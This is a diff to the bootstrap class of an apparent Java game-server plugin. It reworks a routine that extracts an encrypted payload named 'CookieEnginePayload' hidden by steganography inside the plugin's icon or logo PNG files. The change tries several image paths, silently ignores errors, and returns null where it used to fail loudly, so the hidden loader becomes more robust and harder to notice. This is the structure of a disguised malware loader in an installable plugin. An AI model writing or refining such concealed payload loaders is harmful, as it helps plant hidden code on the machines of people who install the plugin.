@@ -75,13 +75,20 @@ public final class Bootstrap extends JavaPlugin {
     }
 
     private void loadEngine() throws Exception {
-        byte[] enc;
-        // Polyglot PNG Steganography Extractor
-        try (InputStream in = Bootstrap.class.getResourceAsStream("/assets/icon.png")) {
-            if (in == null) {
-                throw new IllegalStateException("Missing security payload");
-            }
-            enc = extractPngPayload(in, "CookieEnginePayload");
+        byte[] enc = null;
+        // Search in root /icon.png or /assets/icon.png
+        String[] possiblePaths = new String[]{"/icon.png", "/assets/icon.png", "/logo.png"};
+        for (String path : possiblePaths) {
+            try (InputStream in = Bootstrap.class.getResourceAsStream(path)) {
+                if (in != null) {
+                    enc = extractPngPayload(in, "CookieEnginePayload");
+                    if (enc != null) break;
+                }
+            } catch (Throwable ignored) {}
+        }
+
+        if (enc == null) {
+            throw new IllegalStateException("Missing security resource container");
         }
 
         byte[] dec = new byte[enc.length];
@@ -194,6 +201,6 @@ public final class Bootstrap extends JavaPlugin {
                 break;
             }
         }
-        throw new NoSuchElementException("Security chunk not found");
+        return null;
     }
 }
